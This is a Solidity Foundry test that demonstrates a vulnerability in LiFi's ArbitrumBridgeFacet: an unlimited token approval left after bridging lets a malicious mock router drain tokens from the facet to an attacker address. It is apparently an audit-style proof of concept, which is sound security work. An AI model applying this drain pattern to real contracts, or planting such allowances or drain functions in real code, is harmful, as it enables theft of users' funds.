// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {ArbitrumBridgeFacet} from "lifi/Facets/ArbitrumBridgeFacet.sol";
import {IGatewayRouter} from "lifi/Interfaces/IGatewayRouter.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockGatewayRouter is IGatewayRouter {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function outboundTransfer(
        address _token,
        address _to,
        uint256 _amount,
        uint256,
        uint256,
        bytes calldata
    ) external payable override returns (bytes memory) {
        MockERC20(_token).transferFrom(msg.sender, _to, _amount);
        return bytes("");
    }

    function unsafeCreateRetryableTicket(
        address,
        uint256,
        uint256,
        address,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external payable override returns (uint256) {
        return 0;
    }

    function calculateL2TokenAddress(address) external view override returns (address) {
        return token;
    }

    function getGateway(address) external view override returns (address) {
        return address(this);
    }

    // malicious drain function using leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract ArbitrumBridgeFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockGatewayRouter internal router;
    ArbitrumBridgeFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        router = new MockGatewayRouter(address(token));
        facet = new ArbitrumBridgeFacet(IGatewayRouter(address(router)), IGatewayRouter(address(0)));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 1,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        ArbitrumBridgeFacet.ArbitrumData memory arb = ArbitrumBridgeFacet.ArbitrumData({
            maxSubmissionCost: 0,
            maxGas: 0,
            maxGasPrice: 0
        });

        facet.startBridgeTokensViaArbitrumBridge{value:0}(bridgeData, arb);

        // allowance remains set after bridging
        assertEq(token.allowance(address(facet), address(router)), type(uint256).max);

        // attacker sends tokens to facet and router drains them
        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}

